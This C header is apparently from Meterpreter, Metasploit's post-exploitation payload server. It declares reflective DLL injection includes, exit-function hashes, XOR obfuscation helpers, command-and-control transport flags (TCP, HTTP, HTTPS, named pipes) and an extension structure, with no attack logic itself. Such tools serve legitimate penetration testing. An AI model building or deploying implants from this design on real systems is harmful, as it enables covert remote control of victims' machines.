#ifndef _METERPRETER_METSRV_METSRV_H
#define _METERPRETER_METSRV_METSRV_H

/*
 * Version number
 *                               v------- major major
 *                                 v----- major minor
 *                                   v--- minor major
 *                                     v- minor minor
 */
#define METSRV_VERSION_NUMBER 0x00010001

#define _WIN32_WINNT _WIN32_WINNT_WINXP
#define USE_DLL

#include "common.h"

#include "remote_dispatch.h"
#include "libloader.h"

#define EXITFUNC_SEH      0xEA320EFE
#define EXITFUNC_THREAD   0x0A2A1DE0
#define EXITFUNC_PROCESS  0x56A2B5F0

#include "../ReflectiveDLLInjection/inject/src/GetProcAddressR.h"
#include "../ReflectiveDLLInjection/inject/src/LoadLibraryR.h"
#include "../ReflectiveDLLInjection/dll/src/ReflectiveLoader.h"

/*! @brief Indication that the Meterpreter transport is using TCP. */
#define METERPRETER_TRANSPORT_TCP    0x1
/*! @brief Indication that the Meterpreter transport is using HTTP. */
#define METERPRETER_TRANSPORT_HTTP   0x2
/*! @brief Indication that the Meterpreter transport is using HTTPS. */
#define METERPRETER_TRANSPORT_HTTPS  (0x4 | METERPRETER_TRANSPORT_HTTP)
/*! @brief Indication that the Meterpreter transport is using  named pipes. */
#define METERPRETER_TRANSPORT_PIPE   0x8

#include "base.h"
#include "core.h"
#include "remote.h"
#include "pivot_tree.h"
#include "channel.h"
#include "scheduler.h"
#include "thread.h"
#include "unicode.h"
#include "list.h"
#include "zlib.h"

#include "common_metapi.h"

VOID sleep(DWORD seconds);
int current_unix_timestamp(void);
VOID xor_bytes(BYTE xorKey[4], LPBYTE buffer, DWORD bufferSize);
BOOL is_null_guid(BYTE guid[sizeof(GUID)]);
VOID rand_xor_key(BYTE buffer[4]);

DWORD server_setup(MetsrvConfig* config);
typedef DWORD (*PSRVINIT)(MetApi* api, Remote *remote);
typedef DWORD (*PSRVDEINIT)(Remote *remote);
typedef VOID (*PCMDADDED)(UINT command_id);
typedef DWORD (*PSTAGELESSINIT)(UINT extensionId, LPBYTE data, DWORD dataSize);

typedef struct _EXTENSION
{
	HMODULE library;
	PSRVINIT init;
	PSRVDEINIT deinit;
	PCMDADDED commandAdded;
	PSTAGELESSINIT stagelessInit;
	Command* start;
	Command* end;
} EXTENSION, *PEXTENSION;

#endif
